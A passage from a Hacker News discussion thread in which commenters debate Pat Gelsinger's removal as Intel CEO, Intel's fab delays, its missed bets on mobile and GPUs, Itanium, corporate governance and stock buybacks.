anonymous. There isn't anywhere I can rally the other shareholders. And on top of that, loads of companies have dual-class share structures specifically designed to stop shareholders having any say. Whether you're invested in Facebook, FitBit or Ford - good luck exercising control when insiders' shares have 10x the votes yours have. And that's without getting into passive investors and pension funds. If I don't like Intel's current board, just selling my shares is far, far simpler than exercising any sort of meaningful active governance. reply FredPret 13 hours agorootparentprevIndex funds vote the way they think, and they control massive amounts of capital. Too many retail investors just vote with the \"board recommendations\" all the way down the ticket every year, if they even bother to vote. reply szundi 12 hours agorootparentSo when a company's ownership reaches 50%+ of index funds, board recommends themselves and ... end of story? Never removed whatever happens? Fun reply michaelt 8 hours agorootparentWell, index funds vote in accordance with a published policy like https://corporate.vanguard.com/content/dam/corp/advocate/inv... So the boards don't have totally unchecked power. But despite that policy being 22 pages long, it doesn't pay any attention to companies' individual circumstances. Vanguard's voting policy doesn't have an opinion on EA's lootboxes, or Intel's 18A node, or Disney's approach to Star Wars. reply twoodfin 6 hours agorootparentThat’s what Vanguard investors are paying for, or rather, not paying for. Passive investing is cheaper, this is what “passive” means. Historically, in the aggregate, boards of US public companies are competent enough to create good returns without strategic investor direction. reply FredPret 4 hours agorootparentYou can’t easily dismiss the problem by pointing to history. In those historic times, stock ownership was much more restricted to rich investors (not a good thing) who are far more opinionated in AGMs (a very good thing) than some faceless index fund or Robin Hooder who doesn’t even realize they should vote at all. So boards used to perform but they also used to have pressure to perform. Will they still perform on autopilot? Maybe, but chaos always wins unless there’s a forcing function (your votes at the AGM). reply chii 11 hours agorootparentprev> So when a company's ownership reaches 50%+ of index funds well luckily, this isn't the case. And most index funds do ask index fund holders for the vote, tho not individually. But if the majority holders end up not following the board recommendations, the index fund would vote that (at least with vanguard - not sure about others). reply spwa4 9 hours agorootparentGreat, that. However the point of capitalism is that people who know the business would invest and make good decisions. In the situation that index funds hold most of the capital accountants will be making all decisions. reply lotsofpulp 4 hours agorootparentThe point of capitalism is that the businesses that have people who know the business and make good decisions eventually win out over the businesses that don’t. That seems like what is happening. reply kurthr 14 hours agorootparentprevThose aren't stock owners, those are etfs and mutual funds. Literally, Vanguard, BlackRock, StateStreet, etc. reply mattmaroon 8 hours agorootparentThe ETFs actually do own the underlying securities and vote the shares. They typically have a mechanism for ETF owners to vote internally on how to vote externally, but the vast majority of ETF owners ignore it so whatever the ETF recommends (which is often from a third party) almost always is what happens. reply ajross 14 hours agorootparentprevIt's not 20 years. Just 12 years ago Intel was launching Ivy Bridge on 22nm and was absolutely on top of the world. It's true they've completely fallen off the pace. But people tend to forget how rapidly this happened. Even as late as the semi-aborted 2018 launch of Cannon Lake it seemed like it was just a routine burp they'd correct with a process respin. Then TSMC quietly reached parity with 7nm, shipped 5nm which was a better process, and by 2021 Apple had jumped ship and Intel was falling behind even AMD. The disaster happened fast. Boards of Directors aren't that agile. reply wtallis 13 hours agorootparentThe 2017 \"launch\" of Cannonlake wasn't something that anyone inside or outside of Intel could have reasonably considered to be a \"routine burp\". It was a desperate move to avoid shareholder lawsuits and possible criminal prosecution. Intel had to ship something under the 10nm label before the end of the year, because they had made far too many (false) promises that 10nm would be working Soon. Cannonlake was a mostly-broken chip because their 10nm process did not work, and Intel never even tried to make significant revenue from it or ramp it to volume production (though they kept promising for months that they were going to ramp). And it was still two years late. Meanwhile, Intel's chip designers kept targeting an unusable process, and wasted years that they should have been iterating on designs for the fab process that actually worked. Skylake shipped in 2015. They didn't deliver a new CPU microarchitecture on 14nm until 5.5 years later, a year and a half after they shipped that same microarchitecture in a mobile-only form when their 10nm finally started to be somewhat usable (but not fast enough for desktop). What were the chip designers doing for all those years? In 2015, Intel knew that 14nm had been harder to bring up than any previous fab process, and they knew that 10nm was proving even harder, but they refused to try making an updated CPU design for 14nm. How could the management not have realized that spending multiple consecutive years not shipping new designs would cause long-term damage to their capability to iterate on CPU designs? Not participating in the feedback loop of actually shipping left Intel with an oversized P-core design and an E-core design that wasn't well-matched to it, making Alder Lake awkward and slapdash when they finally got 10nm working well enough for desktop CPUs. reply spwa4 9 hours agorootparentSure ... THIS is what I don't get. Non-technical (ie. CEO + board before Gelsinger) people are responsible for a technical disaster. They did not, of course, stop creating new technical disasters. Which ended in complete panic and Pat Gelsinger on top. They complain about arrogance, but even if you accept that, it was arrogance BEFORE Gelsinger, with Intel under the control of MBAs that they're talking about. And can I just say, I've seen some seriously arrogant assholes in the tech departments I've worked ... but for absolute incredible arrogance, you need MBAs. reply newsclues 8 hours agorootparentIt’s almost like there is a deep cultural problem. The leadership (not technical) are disconnected from reality. Did engineers know there were problems? Of course, they are smart, but the leadership doesn’t listen reply yvdriess 6 hours agorootparentprevIn defense of the chip designers: Design pipelines are deep and Intel at the time famously had very node-specific designs without industry-standard PDKs. The moment engineers were told to switch a design to 14nm, it basically reset the 5 year design-to-product pipeline. Management failed because they did not hedge the risk by starting a parallel 14nm design effort at first sign of 10nm troubles. They likely were engaged in magical thinking or some variation of the \"Are YOU going to tell him?\" Silicon Valley scene. It does not help that information like that is considered actionable insider trading information. I bet a lot of people working on 10nm designs first heard the news about the delays from the quarterly investor calls. reply wtallis 2 hours agorootparent> Design pipelines are deep and Intel at the time famously had very node-specific designs without industry-standard PDKs. The moment engineers were told to switch a design to 14nm, it basically reset the 5 year design-to-product pipeline. Right. It was well-known publicly that Intel was running their business in a way that maximized the damage any fab troubles would have on their product roadmap. It was obvious a decade ago that Intel needed more flexibility to bring their CPU designs to other fab processes. It took them too long to start working on Rocket Lake, and too long to deliver it. But they have at least made some progress on the problem, since they've been selling x86 CPU cores made at TSMC for the past year. (On a related note: Buying Altera and forcing them to port their entire roadmap over to a broken 10nm process was made even more stupid by the fact that Intel didn't have a usable PDK that outsiders and acquisitions could work with.) reply sangnoir 11 hours agorootparentprev> ...Intel was falling behind even AMD The \"even\" makes the tone of your comment feel a tiny bit disrespectful towards AMD. By 2021, it was clear to me that AMD had their gloves off and were winning. Zen 3 was released in 2020 - the third generation of nearly flawless execution by AMD that Intel failed to respond to - outside of cutting the prices on some CPUs. For a while, Intel held onto the \"fastest single-core speeds\". Back in 2017, my first thought after being blown away by the performance of a first-gen Zen PC build was \"I should buy shares in AMD\" - AMD clearly had a superior product with an even better value proposition. reply mmaniac 7 hours agorootparentI think the point is that Intel had such a lead in the Bulldozer era that for AMD to overtake them was a tremendous failure. I would not say that the first gen of Zen is was a clear winner over Skylake. It took a couple iterations before AMD clearly took the lead. AMD was simply so far behind that several large generational improvements were needed to do better than Intel. reply throwaway48476 6 hours agorootparentZen1 was 20% behind skylake but cheaper per core. Zen2 was 5% behind. Zen3 was faster. reply lotsofpulp 14 hours agorootparentprevMobile phones were picking up a lot of steam by the mid 2000s, and it doesn’t seem like Intel bothered to even investigate developing more power efficient chips. Seems like the leaders just lost the stomach for taking risks, a long time ago. No forays into mobile or GPUs, at least not in the billions of dollar and many years scale that was needed. No stomach to pay the competitive salaries necessary to compete with Apple, Microsoft, Alphabet, Meta, Amazon, Netflix, etc for talent. reply ThrowawayB7 12 hours agorootparentThey did as recently as 2016 and then gave up on it: \"Intel could be on the verge of exiting the market for smartphones and standalone tablets, wasting billions of dollars it spent trying to expand in those markets. The company is immediately canceling Atom chips, code-named Sofia and Broxton, for mobile devices, an Intel spokeswoman confirmed.\" (https://www.pcworld.com/article/414673/intel-is-on-the-verge...) reply easygenes 11 hours agorootparentYeah, Otellini famously turned down Steve Jobs' request to make the chip for the first iPhone, thinking the market wouldn't be big enough. When he got pie in his face, he tried to correct course. By the time he needed to retire, the board wanted to give up on mobile, thinking they would never catch up, and double down on data center. reply twoodfin 6 hours agorootparentAFAICT, this was a self-serving bit of reverse myth-making from Otellini. If there really had been a single binary decision Intel got wrong—saying no to Jobs when they might have said yes—then their collapse looks like bad luck: Nobody bats 1.000. But the way Apple insiders tells this story, there was no way Intel was even being considered in the (short!) window when the original iPhone was being built. Intel was in the middle of selling Xscale, and even that design was too power-hungry. Intel missing mobile was a long history of poor strategic and tactical choices, not one bad call. reply usr1106 12 hours agorootparentprevThey did more than investigate. Nokia, at that time still market leader in mobile phones, wasted a lot of time and effort because management wanted them to move to Intel. Nokia engineers did not believe that Intel would ever reach the required power efficiency. Whether it was self-fullfilling prophecy or just technically impossible is anyone's guess. (No, Nokia did not fail because of Intel, but that miss certainly made the disaster more complete.) reply Maakuth 7 hours agorootparentIntel connection was not the sole reason for Nokia's demise in phones, but it contributed on the failure of their effort to recover from the tailspin. Symbian their old mobile platform was clearly due to be replaced and they had a pretty viable in-house Linux platform, Maemo, that already shipped with N900 in 2009. Instead of iterating on that, they decided to \"join forces\" with Intel and merged Maemo with Intel MobLin to create MeeGo. They wasted at least a year on that and not with a lot to show for it as the Intel chips they planned for never materialized. Obviously it was going to be very difficult to compete as a third platform with the behemoths iOS and Android become during those years. At least the MeeGo and Windows Phone cards were not the winning ones. reply throwaway48476 6 hours agorootparentprevYou forget networks and atoms, and the horrible failure that was x86 android. reply bee_rider 12 hours agorootparentprevThey did Atom. They just didn’t beat ARM. reply kasabali 10 hours agorootparentAtom has always been a laptop chip. They tried to shoeshorn it to handhelds but it sucked for obvious reasons. Think Apple's chips started in iPhone, then iPads and finally very recently ramped up to Macbooks. Even Snapdragon has only very recently released a laptop worthy chip because of the design they've acquihired from Nuvia. reply bee_rider 30 minutes agorootparentBasically agree. Well, it did good enough in netbooks. It could probably have been good in tablets if they kept trying (and if non-iPad tablets really caught on). reply chithanh 8 hours agorootparentprev\"didn't beat\" puts it mildly. Every attempt Intel made at entering the smartphone business was doomed because they were years behind ARM. Paul Thurrott confirmed this with HP when discussing the Elite x3 smartphone: https://www.thurrott.com/hardware/64677/elite-x3-hp-takes-wi... reply szundi 12 hours agorootparentprevApple was an interested customer, but rumors are they perceived Intel extremely arrogant. The chip would have been to iPhone. reply Dalewyn 11 hours agorootparentprev>Then TSMC quietly reached parity with 7nm The true embarrassment was when SMIC (read: China) reached 7nm and thereby surpassed Intel last year (or was that 2022?). Intel then proceeded to waste CHIPS monies and other aid on five digit layoffs and now ousted the one CEO who ostensibly at least had the right idea. At this point I want to see Intel fail (and Boeing too), American Exceptionalism(tm) absolutely needs to have its longass Pinocchio nose broken in half before we have any hope of rebooting ourselves. reply EFreethought 13 hours agorootparentprevFor a lot of companies, you cannot actually vote against a board member. You can either vote for them, or withhold your vote. reply bboygravity 12 hours agorootparentprevThe board might've been deliberately planted there to tank the stock in the long run. Wouldn't be the first time hedge funds do this, but to be fair they prefer small pharma (famously cancer research/meds) startups or generally smaller companies to do it. Wouldn't be surprised though. reply lxdlam 15 hours agoparentprevI've watched the talk in 2022 between Linus and Pat. It's a common talk as a company PR but I think Pat showed me that he is a real engineer to drive this huge and years-old company, not the Wall Street managers. For anyone interested, https://www.youtube.com/watch?v=0m4hlWx7oRk. reply CodeHorizon 14 hours agorootparentIn that video, Linus says he used Pat Gelsinger's book, Programming the 80386, as a reference when working on parts of the Linux kernel. It's cool to see how Pat’s work helped developers like Linus. reply ZiiS 12 hours agorootparentFeels like leading the design of the 486 was probably more significant then coauthoring a book on the 386? reply Philpax 9 hours agorootparentDifferent kinds of help - the book directly teaches people how to program, the other enables new types of programs. Both useful! reply gyomu 14 hours agoparentprevIt seems that “Non technical people don’t belong in management at technical companies” is an impossible lesson to learn for many, no matter how rich or credentialed. reply simpaticoder 13 hours agorootparentThere should be representation in management from every realm in which a company does battle on a complex field. A technical company should have strong representation from engineering, but it cannot and should not neglect lawyers in various specialties (tax, tort, labor) and include those knowledgable in finance, marketing and (when applicable) the supply chain. The members should ALL have \"leadership\" pixie dust. A companies leaders need to have insight and experience in every domain in which the firm faces either existential threat or growth opportunity. reply cedws 8 hours agorootparentprevI think the takeaway should be that if we want Western economies to keep growing, we need to cut these useless rich bureaucrats out and give power to the engineers. reply throwaway48476 6 hours agorootparentElon is an idiot but has a gift for convincing people to spend money building new things, particularly physical. There's a lot of people who could do great things if the funding was available and not just thrown into unicorn wannabe startups. reply AnotherGoodName 3 hours agorootparentI’m convinced a long term successful business needs a >50% owner dictator who’s focused on more than the next quarters dividend payout. That sole owner dictator doesn’t even need to be particularly smart. They can play Diablo all day for all it matters. They just need to be able to make decisions that are longer term than the next balance sheet which the traditional executive class and shareholder structures are failing to do. Zuck, Elon, Bezos etc. reply thayne 12 hours agorootparentprevI don't think that is necessarily true. But if you are non-technical, you need people advising you that are technical and actually listen to their advice. reply kevin_thibedeau 4 hours agorootparentThe problem with non-technical decision makers is that they will mostly listen to the MBAs who think like them and not the technical people. They tend to waste their time on stupid things to prop up their egos, compensating for lack of understanding of their business fundamentals and what direction to go in. reply adamc 18 minutes agorootparentI wonder whether that is a more general problem. E.g., maybe technical decision-makers tend to listen to other engineers and not give enough considerations to financials and market expectations. People tend to hug their ruts. reply 2OEH8eoCRo0 5 hours agorootparentprevWhy? They're a business like any other, albeit with high depreciation in some product lines. reply newsclues 7 hours agorootparentprevYou don’t need to be a technical engineer to be a good leader. But financial engineering is often at odds with real engineering and can harm the product. reply szundi 12 hours agorootparentprevCheck out X these days. There is this \"founder mode\" meme that is about company founders are the culprit of growing bigger and fix how the company works. Imho this is bullshit. It is not about being the founder, but most people just cannot change their ways of working. Like hired managers would not be able with the same chance. At the same time, when founders or engineers cannot change to accomodate some business reality, only time will tell wether they can and manage to lead through that - or the McKinsey usual mantra \"selling off unprofitable business unit\" would have been proved better. reply ekeane 16 hours agoparentprevI was inside since Otellini (left last year). Otellini at least 'stayed the course' reasonably well. I never felt like the company was going to GROW, but at least not die. BK is who did his best to sink the company, multiple mis-guided layoffs, bad top level hirings, and stupid direction changes every time he read a new news article. Don't even mention his absurd AMA on reddit where he couldn't stop using the ellipse and laughing like a 14 year old girl. Bob Swan wasn't the guy who could right the ship. He was another Otellini type guy, someone you bring in to not mess stuff up. Pat was a great pickup for Intel, and his return was my first time hoping that Intel could actually survive and grow. Unfortunately, he came by too late. Foundry STILL hadn't really made progress, and the rot in the rest of the company had set in too far. The brain drain from BK was still being felt everywhere. Frankly, I still feel like Pat was the right guy, 10 years too late. He joined to right the ship, but by the time he came aboard, the ship had already hit the iceberg, and the bow was 30 feet in the air. And now he's being blamed for the ship sinking. reply sheepscreek 8 hours agorootparentThis is a great answer. Pat is not a wartime CEO. He could have been fantastic for Intel if the company was somewhat healthy and the competition was not so fierce. reply throwaway48476 6 hours agorootparentThat's exactly it. I'm not sure they're capable of finding or generating a wartime CEO, the rot is deep. reply baxtr 8 hours agoparentprevJust a small side comment: I don’t think that being technical and focusing on the right things are equivalent. There are examples of people like Steve Jobs who knew how to surround themselves with the right technical people without being too technical themselves. And then there are also the technical leaders that ignore the business side… reply silvestrov 6 hours agorootparentSteve Jobs is the exception that confirms the rule. There are so very few non-tech people who knows how to run a tech company. reply twoodfin 6 hours agorootparentSteve Jobs wasn’t a programmer, but he was absolutely a techie. Go watch some of his marketing and keynote videos from the NeXT days: He understood the technology and more importantly why it mattered to the product and customers. reply baxtr 4 hours agorootparentprevI don’t think that’s true. Also, think about the corollary: if that was true then most certainly the opposite is also true that technical people are terrible at business decisions. Hardly my experience. Some are, but some are excellent business people. reply hmottestad 13 hours agoparentprevWasn’t Krzanich an engineer that climbed the manager ladder? He must have had technical insight. reply yvdriess 6 hours agorootparentIt's not the size of the technical insight that matters, it's what you know what do with it. Point being, a smart and capable CEO can still have misaligned incentives (read: optimize for personal benefit). reply ternaryoperator 15 hours agoparentprevIt's very, very difficult to shrink a public company until the board fully accepts that it has to happen. The problem Gelsinger faced is one that many similarly placed CEOs face. A company is bloated when they come in; they have to make the company smaller; they become the sacrificial lamb for reducing its size and temporarily its income; so another CEO is brought in who recognizes the need to do the same thing; they are also fired; finally, the board brings in a white knight (typically someone with a moniker like \"Chainsaw Al\") who makes them see that the company has to shrink even more to get the turnaround. That CEO gets to keep the job and, if successful, win all the plaudits. reply sheepscreek 7 hours agorootparentThe point you’re missing is urgency. Convincing the board is also an important part of the CEOs job. They need to use all the tools at their disposal. They have to build the necessary relationships to smoothen out the board approvals for their plans. Better yet, they could reach out to major shareholders, pitch their plan to them, and use their influence to get the board in line. There is more than one way to achieve this. Pat must have tried some of this but didn’t succeed. reply silvestrov 6 hours agorootparentThe movie \"Margin Call\" has an excellent scene where this happends: https://www.youtube.com/watch?v=Hhy7JUinlu0 It is clear how it is setup that \"to survive we must act now, not in a week, and we must do this expensive sell-off\" The whole movie is very well worth watching: https://www.imdb.com/title/tt1615147/ reply 01HNNWZ0MV43FF 14 hours agorootparentprevNit: \"they\" reads better reply fransje26 7 hours agoparentprev> These CEOs, all non-technical, focused on dividends, buybacks, and next-quarter results [..] The real issue? The board. Full of people like Boeing execs. They don’t get engineering. Trusting them to fix Intel is like hoping a plane door won’t pop open mid-flight. And that economical model of maximum profit we have \"chosen\" as a society is exactly why we are possibly heading towards failure, as western societies and as economic entities in the very near future. The problem is that once the cracks start to show, whether at Intel with the current crisis or at Boeing with doors blowing out and airplanes crashing due to gross negligence, so much engineering excellence and knowledge has been lost that the tide is pretty much impossible to stop. Enshitification, whether applied to online platforms or to consumer goods is a similar expression of the same problem. Once the quality is lost, the rot has set in and there is simply no way back for the companies involved. reply a-french-anon 11 hours agoparentprevAlso: https://www.semiaccurate.com/2024/12/03/why-did-intel-fire-c... (yes, even if SA is known for its hateboner for Intel) reply ErigmolCt 11 hours agoparentprevI think the question isn't just whether Gelsinger was wrong for Intel... It's whether Intel is capable of empowering any leader to do what’s necessary to rebuild... reply brewdad 16 hours agoparentprevHonestly, I think the thing that got Pat fired was agreeing to suspend stock buybacks for five years as part of the CHIPS act money deal. The Board needs to be able to prop up their investments. reply EFreethought 13 hours agorootparentPersonally I think that buybacks should be illegal like they were before the 1980s. Companies should focus more on their nominal products/services and spend less time playing games with money. reply tliltocatl 8 hours agorootparentBut if buybacks are illegal and dividends are highly discouraged by taxation, what's the purpose of the stocks at all? How are stockholders supposed to get paid back if there is no flow of money from the companies? And no, \"sell stocks for higher price to a greater fool^W^W^W another investor\" cannot work on global level because if the company doesn't distribute it's profits to stockholders, stock price is purely speculative so it essentially becomes a Ponzi even if the is real value production getting done, because the value production doesn't find it's way back to the investors. reply rybosworld 6 hours agorootparent> what's the purpose of the stocks at all? Dividends > dividends are highly discouraged by taxation This is only true today because buybacks aren't taxed Buybacks are ultimately a way of saying \"we don't have a better way to spend this money.\" Consider that, in a world without buybacks, execs have two choices. One is to pay dividends, and eat the tax implications. The other is to find productive ways to spend the money to increase the company's earnings. The taxation of dividends strongly motivates companies to innovate. Buybacks weaken that motivator significantly, because there's no tax implication. It's financial engineering and not a productive use of money. Buybacks are also a pretty neat way for insiders to enrich themselves at the expense of shareholders. Example: Insiders schedule a sell of their shares to occur right after announcing a buyback plan. reply woooooo 5 hours agorootparentWorth noting also that dividends aren't uniquely taxed. Worst case, they're taxed the same as income, but they can also be capital gains which are taxed at a lower rate. So any talk of incentives should include a justification of passive investment being more valuable than work for income, if someone is asking for favorable tax treatment. reply tliltocatl 2 hours agorootparentWasn't aware of that. Yes, I've no clue what I'm talking about. But if buyback gains are also taxed as income when cashing out, what is the advantage of buybacks then? reply ac29 2 hours agorootparentprevQualified dividends are not capital gains, even if they are taxed at the same rate reply cherryteastain 7 hours agorootparentprev> stock price is purely speculative Already is. There's a reason why many quant finance books model stock prices as martingales/random walks. reply Mistletoe 7 hours agorootparentprevWell we used to have this thing called a dividend… reply refurb 5 hours agorootparentprevSaying buybacks were illegal is not accurate. What changed in the 80’s is that a safe harbor was created. Before that companies were at risk of being charged with market manipulation - there were no clear rules on what was market manipulation and what wasn’t. The safe harbor rule 10b-18 simply laid out requirements for buybacks fell into a “safe harbor”, presumed to not be market manipulation. But companies could still do them before that, but it was more risky. reply jdprgm 15 hours agoparentprevshort timelines are a death sentence in 2024 reply njtransit 15 hours agoparentprevI think Gelsinger was fired because Arrow Lake was a total flop. reply CodeHorizon 15 hours agorootparentA promised microcode update for this month has already surfaced in the wild. The Arrow Lake launch certainly didn’t make things easier for Pat. reply vasco 9 hours agoparentprev> He poured billions into fabs in Arizona, Ohio, Germany, and Ireland Him or the CHIPS act? reply markus_zhang 5 hours agoparentprevOr, the late Capitalism. It keeps eating corporations and we can only hope that new ones come up (like SpaceX, AMD, etc.) quicker than old ones fall. reply computerdork 12 hours agoparentprevagreed, 18A is supposed to be amazing according to insiders. reply threeseed 15 hours agoparentprevFor me, I think it’s lazy to blame the board. There have been so many bad technical and operational decisions at Intel that are clearly the responsibility of the CEO and Senior Leadership Team. And it doesn’t require an engineering degree to understand that they missed the boat on power efficiency, AI, cloud etc. reply markhahn 13 hours agorootparentNo offense, but what you say sounds like an argument for the tech approach. Intel didn't lose the cloud, and what you describe as power efficiency was the fab/euv problem (that Pat fixed). AI: okay, but are you sure that Intel should aim to own every market? What if Intel fabs produce a lot of AI chips for fabless vendors? No one has offered any real explanation for why the board would do this, now. 18a is about to go to hvm, which would carry large gains for server and consumer products, in addition to third parties. some mention \"not listening to customers\", which is peculiar, since customers (defined by current and past revenue) want faster, cheaper products (18a). about the only think I can imagine is that the board wanted a lower defect rate on large foundary chips (a potential product, not relevant to current products, except perhap Gaudi and maybe Altera). but firing Pat isn't going to improve defect rates... reply tw1984 11 hours agoparentprevThe real issue is beyond the board. If what you described above is true, well, good luck for competing with China's semiconductor sector given the US government is on its all out war with China on semiconductors. Surely the Chinese can repeat what they achieved in EVs. reply CodeHorizon 5 hours agoparentprevWe may not have the power to fire anyone, but the overwhelming support for Pat shows we can still make an impact. Let the board know they made a mistake and leave a record of it: https://www.intc.com/board-and-governance/contact-the-board. reply ghaff 16 hours agoprevKnowing both Pat and Bryan pretty well professionally, I'm not sure what the right answer here was. I did a \"scare them\" presentation to the senior Intel sales force a long time ago but it was mostly about multi-core Opteron. (And, I suppose it's long enough ago now, to say that Pat told me Gates was basically afraid of Windows requiring multi-core performance.) Intel probably needed to get into GPUs (or other AI-enablement) seriously earlier but I'm not sure how predictable that was. I did tell AMD a long time ago to head off in directions Intel's inertia wouldn't let them. But so much is about execution. ADDED: And, yes, Pat was an Intel insider but I think he was still a pretty good choice for the job. Not sure who else I would go with. reply MBCook 15 hours agoparent> Intel probably needed to get into GPUs (or other AI-enablement) seriously earlier but I'm not sure how predictable that was. You certainly couldn’t know AI was coming. But GPUs have been a thing since the 90s. And they only kept getting better. They were also the only thing other than CPUs that gamers would pay a high margin on. Nvidia and AMD both made plenty of money on them. Intel had it easy. They had the best fab and could’ve easily bundled things for system integrators, netting lots of sales. Instead they had no external GPU and the integrated one when they finally added it was a joke for a very long time. Their newest efforts sound like maybe they’re at least reasonable (though they don’t compete at the top end) but that’s like 15 years too late at least. I don’t know. Seems to me like it would be a pretty obvious money making venture for them, and if they had gotten over the nonsense of Larrabee/making it out of x86 seems like they should’ve been able to have a really good chunk of the market easily. The big win no one could’ve predicted is that if you had a good modern competitive GPU five years ago, then you were well positioned to pivot some for AI. At a minimum they would have a horse somewhere near the race. reply pclmulqdq 14 hours agorootparentBefore AI it was HPC that was obviously becoming huge. AI is the most recent and buzziest form of HPC, but people have been buying AI-style clusters for a while. The Knights [*] products were a great entry point into that market if they would just figure out the software of it. Knights [*] essentially had Atom cores with huge SIMD units, and fast forward to today, an AMD GPU is essentially a small scalar core attached to a huge SIMD unit. IMO it seems like they had the Google problem: if you can't sell a billion units it has to be canceled. reply desertrider12 12 hours agorootparentThat's because Larrabee wasn't totally canceled, it was just pivoted from a gaming GPU to an HPC accelerator in the form of Knights Corner/Landing. The idea of having lots of x86 cores with wide SIMD units didn't change, but it was a lot more successful in the HPC world because anybody could compile an old MPI or OpenMP application with AVX512 and it just worked. reply physicsguy 10 hours agorootparentTo some degree, but the first cards didn’t really give great performance in practice. By the third gen they were worth it and then Intel cancelled it. reply pclmulqdq 6 hours agorootparentprevLarrabee itself was a complete disaster. Xeon Phi resurrected the Larrabee trash heap into something sellable. Sadly, it was never really that easy to program a Xeon Phi. reply rybosworld 6 hours agorootparentprev> The big win no one could’ve predicted is that if you had a good modern competitive GPU five years ago, then you were well positioned to pivot some for AI Nvidia pivoted to AI almost 2 decades ago (late 2000's). And big tech recognized GPU's potential around the same time. Google brain was 2011 and tensorflow was publicly released in 2015 (much earlier internally). The \"Attention is all you need\" paper came out in 2017. That was for many folks, another smoking gun that GPU's are fundamental to AI. The point is: Intel has had a looong time to get into GPU's. They just chose not too. And it wasn't because \"nobody saw ai coming\". reply throwaway48476 6 hours agorootparentThe people intel hired to start a discrete GPU business were just perennial incompetents and played corporate politics instead of delivering. reply lmm 14 hours agorootparentprevIn the old days gamers paid extra for sound cards etc., all these multimedia addons gradually got commoditised. I don't think it would've been a completely crazy bet to assume the same was going to happen to the GPU. reply MBCook 14 hours agorootparentMaybe early (say 94-99?). To some degree that happened. Most computers using an integrated GPU at this point, it’s mostly gamers or people who really need the power that have one on an expansion card. Of course it’s not actually the CPU doing the work, it’s just in the same package. Part of the difference is that audio can only get so good. But graphics don’t have much of a limit yet. We kept adding more colors and higher resolutions and higher refresh rates, more polygons, and even a second display for true 3-D. It’s the true embarrassingly parallel problem we’re throwing more silicon at it just keeps making it better. By the time Intel decided to get “serious“ and develop Larrabee, they clearly saw the market was there and would keep growing otherwise they wouldn’t have even bothered. And honestly, whether it was on the same package as the CPU or an actual part of it the way normal vector units or the branch predictor are, who would benefit more from having a good graphics story to go on their GPU than the king of CPUs. They could use their advantages to just further cement their moat. reply ndiddy 13 hours agorootparentIMO the main reason why dedicated audio cards aren't a thing anymore is that Microsoft killed hardware accelerated audio as part of their driver API changes in Vista. The result is that games today have worse spatial audio than games that came out 20 years ago. If Microsoft hadn't done that, I think audio cards would have been in the same position as video cards where most users have their needs met by integrated solutions and gamers/high end users get dedicated cards (of course dedicated audio cards would have been more of a niche than GPUs). reply kuschku 8 hours agorootparent> The result is that games today have worse spatial audio than games that came out 20 years ago This was already solved 7 years ago, but few games actually make use of it: https://valvesoftware.github.io/steam-audio/ reply omcnoe 12 hours agorootparentprevYeah there were old dedicated sound cards with support for spatial audio, and they were killed. But CPU's also just got really really fast in the meantime. You don't need dedicated hardware for spatial audio processing, it's cheaper and easier to do in software. reply wtallis 12 hours agorootparentThere have been enough attempts post-Vista to do spatial audio on GPUs that I don't think the argument that CPUs were fast enough really holds water. I think it's mainly that spatial audio hasn't been a must-have feature, so omitting it or half-assing it hasn't been a problem. reply wmf 14 hours agorootparentprevThere were even rumors about \"IGP is all you need\" and Intel \"canceling\" Nvidia by eliminating PCIe so there would be nowhere to attach a discrete GPU. (Intel did cancel nForce.) In retrospect that was completely ridiculous. reply MBCook 14 hours agorootparentThe big problem for them is AMD. Anytime they do something stupid (Itanium) they have a competitor right there to take advantage of it. Same problem IBM had. They didn’t like people using “their“ PC architecture, so they decided to make the MCA bus and other proprietary stuff. Force everyone to do what they want. IBM‘s AMD was Compaq and all the clone makers. They all got together and used their power to prevent the market from being screwed up by IBM. I could really see Intel wanting to make that kind of move but it never would’ve worked in reality. reply Tteriffic 13 hours agorootparentItanium was not stupid. Some genuine effort behind it could have changed this whole story. reply markhahn 13 hours agorootparentI'm curious why you think there was not effort behind ia64. I still think ia64 was sunk by the let-the-compiler-do-it tarpit. There were ambivalent aspects such as, at the time, questions of power or chip area. But things like memory latency are just not predictable enough to do strictly in-order pipelines. OoO won. reply pjmlp 11 hours agorootparentNot the OP, but share a similar point of view. Had AMD not been around with AMD64, the industry would have had to get it working no matter what, HP and Microsoft were already on the Itanium train, and if production of x86 got slowly replaced by Itanium that was it, Windows and HP-UX would drag the ecosystems into it, and eventually the remaining issues would be sorted out. reply ghaff 3 hours agorootparentI'm inclined to agree. Intel would have been loathe to go the 64-bit x86 route on their own. But a somewhat resurgent AMD pretty much forced their hand given the sorry state of Itanium development. Absent AMD, I'm pretty sure they'd have found a path to a \"good enough\" Itanium to sell successfully. For what it's worth, I followed Itanium as an IT industry analyst and wrote a short book recently on the topic. https://s3.amazonaws.com/bitmasons.com/docs/Lessons+from+the... reply twoodfin 6 hours agorootparentprevMy issue with this alternative history is Intel’s consumer roadmap for Itanium, or rather its complete lack of one. AFAICT, they expected Itanium to own the high end server/HPC market, while 32-bit x86 would continue supporting PC’s for another decade. That seems remarkably short-sighted in retrospect. reply rwmj 6 hours agorootparentprevWouldn't the world have jumped to Alpha instead? If you're going to switch the entire architecture, might as well switch to one which is sane. reply wmf 55 minutes agorootparentIntel bought Alpha and killed it to eliminate the competition. reply ghaff 3 hours agorootparentprevNo. HP was behind Itanium. In fact, it was basically their idea in the first place. I'm still not entirely sure why Intel went along although I suspect at least some of it was getting away from various x86 cross-licensing agreements. reply pjmlp 6 hours agorootparentprevWindows on Alpha didn't went far, so I guess no. UNIX systems, I also doubt, as we were still in the days each vendor had their own CPUs. reply skocznymroczny 8 hours agorootparentprevIf you were to design a GPU several years ago, people would probably tell you designing it for AI is crazy and cryptocurrencies and raw hashing power is where the money's at. In the end, Nvidia kind of got lucky with their bet on AI. While CUDA has been a thing for a while, it was limited to mostly academic and workstation workloads. It wasn't until LLMs and things like Stable Diffusion when it really became popular. Unfortunately for non-NV users, most of these AI workloads when run locally assume CUDA is present and it's a considerable effort to make them work on non-NV GPUs. It's fairly okay for common workloads like running basic LLMs and SD models, but as soon as you get into more advanced/obscure stuff the harder it gets without CUDA. reply rybosworld 6 hours agorootparent> Nvidia kind of got lucky with their bet on AI I see flavors of this narrative quite often. Nvidia has been positioning their GPU's for AI since the late 2000's. And their GPU's were being used for AI at least as early as 2011 To me, it doesn't seem fair to discount Nvidia's foresight. A lot of smart people saw this opportunity even before the invention of LLM's. That's a bit like building a light bulb before discovering electricity. reply ghaff 3 hours agorootparentI do think it's unfair to discount Nvidia's success as \"having gotten lucky.\" On the other hand, I also think the back-to-back 1-2 punch of crypto and LLMs was probably hard to foresee as something way more important than a handful of high-end 